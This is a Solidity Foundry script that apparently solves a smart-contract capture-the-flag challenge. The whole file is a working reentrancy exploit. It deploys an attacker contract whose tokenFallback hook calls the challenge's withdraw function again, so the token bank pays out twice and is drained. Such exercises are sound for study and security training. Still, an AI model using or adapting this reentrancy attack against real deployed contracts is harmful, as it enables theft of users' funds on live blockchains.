// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.16;

import "forge-std/Script.sol";

interface IChallenge {
    function isComplete() external returns (bool);
    function token() external returns (ISimpleERC223Token);
    function withdraw(uint256 amount) external;
}

interface ISimpleERC223Token {
    function transfer(address to, uint256 value) external returns (bool success);
}

contract ExploitScript is Script {
    function run(address instanceAddress) public {
        vm.startBroadcast();
        IChallenge challenge = IChallenge(instanceAddress);
        uint256 amount = 500000 * 10**18;
        challenge.withdraw(amount);
        Exploit exploit = new Exploit(instanceAddress);
        challenge.token().transfer(address(exploit), amount);
        exploit.exploit();
        require(challenge.isComplete());
    }
}

contract Exploit {
    address immutable instanceAddress;
    uint256 constant amount = 500000 * 10**18;
    uint256 count = 0;
    bool underExploit = false;

    constructor(address instanceAddress_) payable {
        instanceAddress = instanceAddress_;
    }

    function exploit() public {
        underExploit = true;
        IChallenge(instanceAddress).token().transfer(instanceAddress, amount);
        IChallenge(instanceAddress).withdraw(amount);    
        underExploit = false;
    }

    function tokenFallback(address, uint256, bytes calldata) public {
        if (underExploit && count < 1) {
            count += 1;
            IChallenge(instanceAddress).withdraw(amount);
        }
    }
}
